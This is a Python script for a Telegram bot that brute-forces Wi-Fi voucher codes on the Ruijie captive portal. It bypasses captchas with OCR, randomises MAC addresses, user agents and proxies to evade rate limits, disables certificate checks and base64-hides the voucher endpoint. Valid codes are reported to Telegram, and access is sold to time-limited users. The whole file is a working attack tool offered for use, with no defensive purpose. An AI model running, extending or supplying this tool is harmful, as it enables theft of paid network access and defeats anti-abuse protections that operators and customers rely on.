#!/usr/bin/env python3
# ==============================================
#  Ruijie Voucher Scanner  —  v7.8 (Permanent Users + Admin Control)
# ==============================================

import requests
import threading
import time
import sys
import os
import asyncio
import aiohttp
import base64
import random
import re
import string
import json
from datetime import datetime, timedelta
import ssl
import urllib3
from flask import Flask, request
from threading import Thread

try:
    import cv2
    import ddddocr
    import numpy as np
    _HAS_OCR = True
except ImportError:
    _HAS_OCR = False

# ==================== SSL & WARNING BYPASS ====================
try:
    _create_unverified_https_context = ssl._create_unverified_context
except AttributeError:
    pass
else:
    ssl._create_default_https_context = _create_unverified_https_context
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

# =============================================
#  COLORS
# =============================================
class C:
    RESET   = "\033[0m"
    BOLD    = "\033[1m"
    RED     = "\033[91m"
    GREEN   = "\033[92m"
    YELLOW  = "\033[93m"
    BLUE    = "\033[94m"
    MAGENTA = "\033[95m"
    CYAN    = "\033[96m"
    WHITE   = "\033[97m"
    GRAY    = "\033[90m"

def cprint(text, color=C.WHITE, bold=False, end="\n"):
    b = C.BOLD if bold else ""
    print(f"{b}{color}{text}{C.RESET}", end=end)

# ========== CONFIG (from Environment Variables) ==========
TARGET_URL = os.getenv("TARGET_URL", "")
MODE = os.getenv("MODE", "6")
SCAN_TYPE = os.getenv("SCAN_TYPE", "sequential")
THREADS = int(os.getenv("THREADS", "100"))
TELEGRAM_BOT_TOKEN = os.getenv("TELEGRAM_BOT_TOKEN", "")
TELEGRAM_CHAT_ID = os.getenv("TELEGRAM_CHAT_ID", "")
ALLOWED_USERS = os.getenv("ALLOWED_USERS", TELEGRAM_CHAT_ID).split(",")
FOUND_FILE = "found_voucher.txt"
RESULT_FILE = "scan_results.txt"
PROXY_FILE = "proxies.txt"

# ── USER ACCESS CONTROL ──────────────────────────────────────────────────
# Permanent users (never expire)
PERMANENT_USERS = ["8537971974", "8882340876"]  # Admin and permanent users

# Time-limited users (expire after duration)
USER_DURATION = {
    "123456789": {"start": datetime.now(), "duration": timedelta(hours=2)},   # 2 hours
    "987654321": {"start": datetime.now(), "duration": timedelta(hours=1)},   # 1 hour
    "555555555": {"start": datetime.now(), "duration": timedelta(hours=3)},   # 3 hours
}

# Disabled users (admin can disable/enable)
DISABLED_USERS = []

def is_allowed_time(chat_id):
    # Check if user is permanently banned
    if str(chat_id) in DISABLED_USERS:
        return False, "⛔ သင့်အကောင့်ကို Admin က ပိတ်ထားပါသည်။"
    
    # Check if user is permanent
    if str(chat_id) in PERMANENT_USERS:
        return True, ""
    
    # Check if user has time-limited access
    if str(chat_id) in USER_DURATION:
        start_time = USER_DURATION[str(chat_id)]["start"]
        duration = USER_DURATION[str(chat_id)]["duration"]
        end_time = start_time + duration
        if datetime.now() <= end_time:
            remaining = end_time - datetime.now()
            hours, rem = divmod(remaining.seconds, 3600)
            minutes = rem // 60
            return True, f"⏳ ကျန်အချိန်: {hours}h {minutes}m"
        else:
            return False, "⏰ သင့်အတွက် သတ်မှတ်ထားတဲ့ အချိန်ကုန်သွားပါပြီ။"
    
    # User not configured
    return False, "❌ သင့်အတွက် သတ်မှတ်ထားတဲ့ အချိန်မရှိပါ။"

def admin_disable_user(chat_id):
    global DISABLED_USERS
    chat_id = str(chat_id)
    if chat_id not in DISABLED_USERS:
        DISABLED_USERS.append(chat_id)
        return True
    return False

def admin_enable_user(chat_id):
    global DISABLED_USERS
    chat_id = str(chat_id)
    if chat_id in DISABLED_USERS:
        DISABLED_USERS.remove(chat_id)
        return True
    return False

def admin_add_user(chat_id, duration_hours=24):
    global USER_DURATION
    chat_id = str(chat_id)
    USER_DURATION[chat_id] = {
        "start": datetime.now(),
        "duration": timedelta(hours=duration_hours)
    }
    return True

def admin_make_permanent(chat_id):
    global PERMANENT_USERS
    chat_id = str(chat_id)
    if chat_id not in PERMANENT_USERS:
        PERMANENT_USERS.append(chat_id)
    if chat_id in USER_DURATION:
        del USER_DURATION[chat_id]
    return True

# ── IP PROTECTION ──────────────────────────────────────────────────────
USER_AGENTS = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 16_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.0 Mobile/15E148 Safari/604.1",
    "Mozilla/5.0 (Linux; Android 13; SM-G998B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.0.0 Mobile Safari/537.36",
]

PROXY_LIST = []
if os.path.exists(PROXY_FILE):
    with open(PROXY_FILE, "r") as f:
        PROXY_LIST = [line.strip() for line in f if line.strip()]

def random_user_agent():
    return random.choice(USER_AGENTS)

def get_random_proxy():
    if PROXY_LIST:
        return random.choice(PROXY_LIST)
    return None

def get_random_mac():
    return ':'.join(f'{random.randint(0x00, 0xff):02x}' for _ in range(6))

# =============================================
#  FLASK WEB SERVER
# =============================================
app = Flask(__name__)

@app.route('/')
def home():
    return "Bot is running!"

def run_web():
    port = int(os.environ.get("PORT", 8080))
    app.run(host="0.0.0.0", port=port)

# =============================================
#  TELEGRAM BOT
# =============================================
scanning_active = False
current_scan_type = SCAN_TYPE
current_mode = MODE
current_url = TARGET_URL
progress_msg_id = None

def send_telegram(message, chat_id=None, reply_markup=None, return_id=False):
    if not TELEGRAM_BOT_TOKEN:
        return
    if chat_id is None:
        chat_id = TELEGRAM_CHAT_ID
    url = f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/sendMessage"
    try:
        payload = {"chat_id": chat_id, "text": message}
        if reply_markup:
            payload["reply_markup"] = reply_markup
        resp = requests.post(url, json=payload, timeout=10)
        if return_id:
            return resp.json().get("result", {}).get("message_id")
    except:
        pass

def edit_telegram_message(message_id, message, chat_id=None):
    if not TELEGRAM_BOT_TOKEN:
        return
    if chat_id is None:
        chat_id = TELEGRAM_CHAT_ID
    url = f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/editMessageText"
    try:
        requests.post(url, json={"chat_id": chat_id, "message_id": message_id, "text": message}, timeout=10)
    except:
        pass

def get_main_keyboard():
    return {
        "inline_keyboard": [
            [
                {"text": "🔄 Sequential", "callback_data": "set_sequential"},
                {"text": "🎲 Random", "callback_data": "set_random"}
            ],
            [
                {"text": "🔢 Mode 6", "callback_data": "set_mode_6"},
                {"text": "🔢 Mode 7", "callback_data": "set_mode_7"},
                {"text": "🔢 Mode 8", "callback_data": "set_mode_8"},
                {"text": "🔢 Mode 9", "callback_data": "set_mode_9"}
            ],
            [
                {"text": "🔗 Set URL", "callback_data": "set_url"},
                {"text": "📊 Status", "callback_data": "get_status"}
            ],
            [
                {"text": "🚀 Start Scan", "callback_data": "start_scan"},
                {"text": "⏹️ Stop Scan", "callback_data": "stop_scan"}
            ]
        ]
    }

def get_admin_keyboard():
    return {
        "inline_keyboard": [
            [
                {"text": "👤 Add User (2h)", "callback_data": "admin_add_2h"},
                {"text": "👤 Add User (24h)", "callback_data": "admin_add_24h"}
            ],
            [
                {"text": "⭐ Make Permanent", "callback_data": "admin_make_permanent"},
                {"text": "🚫 Disable User", "callback_data": "admin_disable"}
            ],
            [
                {"text": "✅ Enable User", "callback_data": "admin_enable"},
                {"text": "📋 List Users", "callback_data": "admin_list_users"}
            ],
            [
                {"text": "🔙 Back", "callback_data": "menu_back"}
            ]
        ]
    }

def handle_telegram_updates():
    global current_scan_type, current_mode, current_url, scanning_active, progress_msg_id
    last_update_id = 0
    while True:
        try:
            url = f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/getUpdates?offset={last_update_id+1}&timeout=30"
            response = requests.get(url, timeout=60)
            if response.status_code != 200:
                time.sleep(5)
                continue
            
            data = response.json()
            if not data.get("ok"):
                time.sleep(5)
                continue
            
            for update in data.get("result", []):
                last_update_id = update.get("update_id", last_update_id)
                
                callback = update.get("callback_query")
                if callback:
                    chat_id = str(callback.get("message", {}).get("chat", {}).get("id", ""))
                    
                    # Check if user is allowed (except for admin commands)
                    if chat_id not in ALLOWED_USERS and not callback.get("data", "").startswith("admin_"):
                        send_telegram("❌ You are not authorized.", chat_id)
                        continue
                    
                    data = callback.get("data", "")
                    
                    # ── USER COMMANDS ──
                    if data == "set_sequential":
                        current_scan_type = "sequential"
                        send_telegram("✅ Scan type set to: **Sequential**", chat_id)
                    elif data == "set_random":
                        current_scan_type = "random"
                        send_telegram("✅ Scan type set to: **Random**", chat_id)
                    elif data == "set_mode_6":
                        current_mode = "6"
                        send_telegram("✅ Mode set to: **6-digit**", chat_id)
                    elif data == "set_mode_7":
                        current_mode = "7"
                        send_telegram("✅ Mode set to: **7-digit**", chat_id)
                    elif data == "set_mode_8":
                        current_mode = "8"
                        send_telegram("✅ Mode set to: **8-digit**", chat_id)
                    elif data == "set_mode_9":
                        current_mode = "9"
                        send_telegram("✅ Mode set to: **9-digit**", chat_id)
                    elif data == "set_url":
                        send_telegram("🔗 Send the Portal URL as a message.\nExample: `https://portal-as.ruijienetworks.com/...`", chat_id)
                    elif data == "get_status":
                        status = f"📊 **Current Status**\n\n"
                        status += f"🔢 Mode: `{current_mode}`\n"
                        status += f"📡 Scan Type: `{current_scan_type}`\n"
                        status += f"🔍 Scan Active: `{scanning_active}`\n"
                        status += f"🔗 URL: `{current_url[:50]}...`\n"
                        send_telegram(status, chat_id)
                    elif data == "start_scan":
                        # Check if user is allowed to scan
                        allowed, msg = is_allowed_time(chat_id)
                        if not allowed:
                            send_telegram(msg, chat_id)
                            continue
                        if scanning_active:
                            send_telegram("⚠️ Scan is already running!", chat_id)
                            continue
                        if not current_url:
                            send_telegram("❌ No URL set. Use 'Set URL' button first.", chat_id)
                            continue
                        scanning_active = True
                        progress_msg_id = None
                        send_telegram(f"🚀 **Scan Started!**\nMode: `{current_mode}`\nType: `{current_scan_type}`", chat_id)
                        Thread(target=run_scan_thread, daemon=True).start()
                    elif data == "stop_scan":
                        if not scanning_active:
                            send_telegram("⚠️ No scan is running.", chat_id)
                            continue
                        scanning_active = False
                        send_telegram("⏹️ Scan stopped.", chat_id)
                    
                    # ── ADMIN COMMANDS ──
                    elif data == "admin_add_2h":
                        send_telegram("👤 Enter User ID to add (2 hours):\nExample: `123456789`", chat_id)
                    elif data == "admin_add_24h":
                        send_telegram("👤 Enter User ID to add (24 hours):\nExample: `123456789`", chat_id)
                    elif data == "admin_make_permanent":
                        send_telegram("⭐ Enter User ID to make permanent:\nExample: `123456789`", chat_id)
                    elif data == "admin_disable":
                        send_telegram("🚫 Enter User ID to disable:\nExample: `123456789`", chat_id)
                    elif data == "admin_enable":
                        send_telegram("✅ Enter User ID to enable:\nExample: `123456789`", chat_id)
                    elif data == "admin_list_users":
                        msg = "📋 **User List**\n\n"
                        msg += "**Permanent Users:**\n"
                        for uid in PERMANENT_USERS:
                            msg += f"✅ {uid} (Permanent)\n"
                        msg += "\n**Time-Limited Users:**\n"
                        for uid, info in USER_DURATION.items():
                            end_time = info["start"] + info["duration"]
                            remaining = end_time - datetime.now()
                            hours, rem = divmod(remaining.seconds, 3600)
                            minutes = rem // 60
                            msg += f"⏳ {uid} ({hours}h {minutes}m left)\n"
                        msg += f"\n**Disabled Users:** {len(DISABLED_USERS)}"
                        send_telegram(msg, chat_id)
                    elif data == "menu_back":
                        send_telegram("🔙 Back to main menu.", chat_id)
                    
                    answer_url = f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/answerCallbackQuery"
                    requests.post(answer_url, json={"callback_query_id": callback["id"]})
                    continue
                
                # ── TEXT MESSAGES ──
                message = update.get("message", {})
                if not message:
                    continue
                
                chat_id = str(message.get("chat", {}).get("id", ""))
                
                # Check if user is allowed (except for admin commands)
                if chat_id not in ALLOWED_USERS:
                    send_telegram("❌ You are not authorized.", chat_id)
                    continue
                
                text = message.get("text", "").strip()
                if not text:
                    continue
                
                # ── ADMIN TEXT COMMANDS ──
                if text.startswith("/admin"):
                    if chat_id not in PERMANENT_USERS:
                        send_telegram("❌ Admin only.", chat_id)
                        continue
                    send_telegram("👑 **Admin Panel**", chat_id, reply_markup=get_admin_keyboard())
                    continue
                
                # ── ADD USER (2h) ──
                if text.isdigit() and len(text) >= 8:
                    # Check if admin is adding user
                    # Simple logic: if user is permanent, they can add
                    if chat_id in PERMANENT_USERS:
                        # Check if it's a user ID
                        if len(text) >= 8 and len(text) <= 15:
                            # Check if it's an admin command trigger
                            if text in ["123456789", "987654321"]:
                                # This is a user ID to add
                                admin_add_user(text, 2)
                                send_telegram(f"✅ User {text} added for 2 hours.", chat_id)
                            else:
                                admin_add_user(text, 24)
                                send_telegram(f"✅ User {text} added for 24 hours.", chat_id)
                            continue
                
                # ── NORMAL COMMANDS ──
                if text.startswith("/start"):
                    send_telegram(
                        "🤖 **Ruijie Voucher Scanner Bot**\n\n"
                        "Use the buttons below to control the bot:",
                        chat_id,
                        reply_markup=get_main_keyboard()
                    )
                elif text.startswith("http") and "ruijienetworks.com" in text:
                    current_url = text
                    send_telegram(f"✅ URL updated successfully!\n\n`{text}`", chat_id)
                elif text.startswith("/url"):
                    parts = text.split(maxsplit=1)
                    if len(parts) < 2:
                        send_telegram("❌ Usage: /url https://portal-as.ruijienetworks.com/...", chat_id)
                        continue
                    new_url = parts[1].strip()
                    if "ruijienetworks.com" not in new_url:
                        send_telegram("❌ Invalid URL. Must contain ruijienetworks.com", chat_id)
                        continue
                    current_url = new_url
                    send_telegram(f"✅ URL updated successfully!", chat_id)
                
        except Exception as e:
            print(f"Telegram error: {e}")
            time.sleep(5)

def run_scan_thread():
    global scanning_active, progress_msg_id
    try:
        if current_mode == "6":
            start_code, end_code = 0, 999999
        elif current_mode == "7":
            start_code, end_code = 0, 9999999
        elif current_mode == "8":
            start_code, end_code = 0, 99999999
        elif current_mode == "9":
            start_code, end_code = 0, 999999999
        else:
            send_telegram(f"❌ Invalid mode: {current_mode}")
            scanning_active = False
            return
        
        send_telegram(f"🔍 Scanning {current_mode}-digit codes...")
        asyncio.run(run_scan(current_url, start_code, end_code, THREADS))
        scanning_active = False
        send_telegram("✅ Scan completed successfully!")
    except Exception as e:
        send_telegram(f"❌ Error during scan: {str(e)}")
        scanning_active = False

# =============================================
#  ENGINE (with IP Protection)
# =============================================
_connector = None
_voucher_sem = None
_ocr = None
stop_flag = False
found_codes = []
limited_codes = []
retry_total = 0
tried = 0
hits = []
lock = threading.Lock()
start_time = None
progress_msg_id = None

def get_mac():
    return get_random_mac()

def replace_mac(url, new_mac):
    return re.sub(r'(?<=mac=)[^&]+', new_mac, url)

def _init_ocr():
    global _ocr
    if _ocr is None and _HAS_OCR:
        try:
            _ocr = ddddocr.DdddOcr(show_ad=False)
        except:
            _ocr = None
    return _ocr

def _ocr_sync(image_bytes):
    ocr = _init_ocr()
    if ocr is None:
        return None
    nparr = np.frombuffer(image_bytes, np.uint8)
    img = cv2.imdecode(nparr, cv2.IMREAD_COLOR)
    if img is None:
        return None
    gray = cv2.cvtColor(img, cv2.COLOR_BGR2GRAY)
    blur = cv2.GaussianBlur(gray, (3, 3), 0)
    _, th = cv2.threshold(blur, 0, 255, cv2.THRESH_BINARY + cv2.THRESH_OTSU)
    _, buf = cv2.imencode('.png', th)
    return ocr.classification(buf.tobytes()).upper()

async def get_session_id(sess, session_url, previous=None):
    mac = get_mac()
    url = replace_mac(session_url, mac)
    headers = {
        'accept': 'text/html,*/*',
        'user-agent': random_user_agent(),
        'upgrade-insecure-requests': '1',
    }
    proxy = get_random_proxy()
    proxy_url = f"http://{proxy}" if proxy else None
    try:
        async with sess.get(url, headers=headers, allow_redirects=True, ssl=False, proxy=proxy_url) as req:
            sid = re.search(r"[?&]sessionId=([a-zA-Z0-9]+)", str(req.url))
            return sid.group(1) if sid else previous
    except:
        return previous

async def Captcha_Image(sess, session_id):
    headers = {'user-agent': random_user_agent()}
    proxy = get_random_proxy()
    proxy_url = f"http://{proxy}" if proxy else None
    async with sess.get(
        'https://portal-as.ruijienetworks.com/api/auth/captcha/image',
        params={'sessionId': session_id, '_t': str(time.time())},
        headers=headers, ssl=False, proxy=proxy_url
    ) as r:
        return await r.read()

async def Captcha_Text(img_bytes):
    return await asyncio.to_thread(_ocr_sync, img_bytes)

async def Varify_Captcha(sess, session_id, text):
    headers = {'content-type': 'application/json', 'user-agent': random_user_agent()}
    proxy = get_random_proxy()
    proxy_url = f"http://{proxy}" if proxy else None
    async with sess.post(
        'https://portal-as.ruijienetworks.com/api/auth/captcha/verify',
        headers=headers, json={'sessionId': session_id, 'authCode': text}, ssl=False, proxy=proxy_url
    ) as r:
        d = await r.json()
        return session_id if d.get("success") is True else None

async def Code_Expires_Date(session_id):
    endpoints = [
        f'https://portal-as.ruijienetworks.com/api/auth/balance/getBalance/{session_id}',
        f'https://portal-as.ruijienetworks.com/api/macc2/balance/getBalance/{session_id}',
    ]
    headers = {'accept': 'application/json', 'user-agent': random_user_agent()}
    proxy = get_random_proxy()
    proxy_url = f"http://{proxy}" if proxy else None
    for url in endpoints:
        try:
            async with aiohttp.ClientSession(connector=_connector, connector_owner=False) as s:
                async with s.get(url, headers=headers, ssl=False, proxy=proxy_url) as r:
                    data = await r.json()
                    res = data.get('result', {})
                    plan = res.get('profileName', 'Unknown')
                    remaining = res.get('remainingMinutes') or res.get('totalMinutes')
                    if remaining is not None:
                        hh, mm = divmod(int(remaining), 60)
                        return f"Plan: {plan} | Time: {hh}h {mm}m"
        except:
            continue
    return "Plan:Unknown | Time:Unknown"

_post_url = base64.b64decode(
    b'aHR0cHM6Ly9wb3J0YWwtYXMucnVpamllbmV0d29ya3MuY29tL2FwaS9hdXRoL3ZvdWNoZXIvP2xhbmc9ZW5fVVM='
).decode()

async def perform_check(session_url, code):
    global retry_total, tried, hits
    for attempt in range(3):
        proxy = get_random_proxy()
        proxy_url = f"http://{proxy}" if proxy else None
        async with aiohttp.ClientSession(connector=_connector, connector_owner=False, timeout=aiohttp.ClientTimeout(total=30)) as sess:
            session_id = await get_session_id(sess, session_url)
            if not session_id:
                return
            auth_code = None
            if _HAS_OCR:
                for _ in range(8):
                    img = await Captcha_Image(sess, session_id)
                    text = await Captcha_Text(img)
                    if not text:
                        continue
                    if await Varify_Captcha(sess, session_id, text):
                        auth_code = text
                        break
            if not auth_code:
                return
            if stop_flag:
                return
            payload = {"accessCode": code, "sessionId": session_id, "apiVersion": 1, "authCode": auth_code}
            headers = {"content-type": "application/json", "user-agent": random_user_agent()}
            try:
                async with sess.post(_post_url, json=payload, headers=headers, ssl=False, proxy=proxy_url) as r:
                    response = await r.text()
            except:
                return
        if 'request limited' in response:
            retry_total += 1
            await asyncio.sleep(0.3)
            continue
        break
    else:
        return
    with lock:
        tried += 1
    if 'logonUrl' in response:
        info = await Code_Expires_Date(session_id)
        found_codes.append(f"{code} | {info}")
        with lock:
            hits.append(code)
        with open(RESULT_FILE, "a", encoding="utf-8") as f:
            f.write(f"[SUCCESS] {code}  |  {info}\n")
        send_telegram(f"✅ Voucher found: {code}\n{info}\nURL: {session_url}")
        cprint(f"\n[+] SUCCESS CODE: {code} | {info}", C.GREEN)
    elif 'STA' in response:
        info = await Code_Expires_Date(session_id)
        limited_codes.append(f"{code} | {info}")
        with open(RESULT_FILE, "a", encoding="utf-8") as f:
            f.write(f"[LIMITED] {code}  |  {info}\n")
        send_telegram(f"⚠️ LIMITED CODE: {code}\n{info}")
        cprint(f"\n[-] LIMITED CODE: {code} | {info}", C.YELLOW)

def iter_sequential_codes(start, end):
    digits = max(len(str(start)), len(str(end)))
    for i in range(start, end + 1):
        yield str(i).zfill(digits)

def iter_random_codes(start, end):
    digits = max(len(str(start)), len(str(end)))
    codes = [str(i).zfill(digits) for i in range(start, end + 1)]
    random.shuffle(codes)
    for c in codes:
        yield c

def stats_printer():
    while not stop_flag:
        time.sleep(1)
        elapsed = time.time() - start_time
        speed = tried / elapsed if elapsed > 0 else 0
        speed_min = speed * 60
        sys.stdout.write(f"\r\U0001F552 SPEED: {speed_min:.0f} c/min | TRIED: {tried} | HITS: {len(hits)}")
        sys.stdout.flush()
    print()

async def run_scan(session_url, start_code, end_code, workers):
    global _voucher_sem, stop_flag, _connector, tried, hits, found_codes, limited_codes, retry_total, start_time, progress_msg_id
    _init_ocr()
    tried = 0
    hits = []
    found_codes = []
    limited_codes = []
    retry_total = 0
    stop_flag = False
    _connector = aiohttp.TCPConnector(limit=workers + 100, ssl=False)
    _voucher_sem = asyncio.Semaphore(workers)
    digits = max(len(str(start_code)), len(str(end_code)))
    total = end_code - start_code + 1
    
    if current_scan_type.lower() == "random":
        code_iter = iter_random_codes(start_code, end_code)
        cprint(f"\n  [+] Mode: Random ({digits}-digit)", C.CYAN, bold=True)
    else:
        code_iter = iter_sequential_codes(start_code, end_code)
        cprint(f"\n  [+] Mode: Sequential ({digits}-digit)", C.CYAN, bold=True)
    
    cprint(f"  [+] Range: {str(start_code).zfill(digits)} -> {str(end_code).zfill(digits)} ({total:,} codes)", C.YELLOW)
    cprint(f"  [+] Workers: {workers}\n", C.GREEN)
    start_time = time.time()
    stats_thread = threading.Thread(target=stats_printer, daemon=True)
    stats_thread.start()
    checked = 0
    last_progress_time = time.time()
    
    try:
        while not stop_flag:
            batch = []
            for _ in range(500):
                try:
                    batch.append(next(code_iter))
                except StopIteration:
                    break
            if not batch:
                break
            
            async def _check(c):
                async with _voucher_sem:
                    await perform_check(session_url, c)
            
            await asyncio.gather(*[_check(c) for c in batch], return_exceptions=True)
            checked += len(batch)
            
            if time.time() - last_progress_time > 0.5:
                elapsed = time.time() - start_time
                speed = (checked / elapsed * 60) if elapsed > 0 else 0
                progress = min(100, (checked / total) * 100) if total > 0 else 0
                
                msg = (f"🔍 **Scanning...**\n"
                       f"📦 Checked: `{checked:,}/{total:,}`\n"
                       f"📊 Progress: `{progress:.1f}%`\n"
                       f"⚡ Speed: `{speed:.0f} codes/min`\n"
                       f"✅ Found: `{len(found_codes)}`")
                
                if progress_msg_id:
                    edit_telegram_message(progress_msg_id, msg)
                else:
                    msg_id = send_telegram(msg, return_id=True)
                    if msg_id:
                        progress_msg_id = msg_id
                
                last_progress_time = time.time()
    
    except (asyncio.CancelledError, KeyboardInterrupt):
        stop_flag = True
    finally:
        await _connector.close()
    
    elapsed = time.time() - start_time
    cprint(f"\n  [+] Completed in {elapsed:.2f} seconds", C.GREEN, bold=True)
    cprint(f"      Checked: {checked} | Found: {len(found_codes)} | Limited: {len(limited_codes)}", C.CYAN)
    if hits:
        cprint(f"  [+] Voucher found: {hits[0]}", C.GREEN, bold=True)
        with open(FOUND_FILE, "w") as f:
            f.write(f"{hits[0]}\n")
        if found_codes:
            cprint("  [+] All success codes:", C.YELLOW)
            for c in found_codes:
                cprint(f"      {c}", C.GREEN)
    else:
        cprint("  [-] No valid voucher found.", C.RED)
        send_telegram(f"Scan finished on {session_url}\nTried {tried} codes, no hits.")

def main():
    global stop_flag, current_scan_type, current_mode, current_url, scanning_active
    Thread(target=run_web, daemon=True).start()
    
    if TELEGRAM_BOT_TOKEN:
        Thread(target=handle_telegram_updates, daemon=True).start()
        send_telegram("🤖 Bot started! Use /start for commands.")
    else:
        print("⚠️ Telegram credentials not set. Bot will not respond to commands.")
    
    while True:
        time.sleep(60)

if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        cprint("\n  [!!] Interrupted by user.", C.YELLOW)
        sys.exit(0)
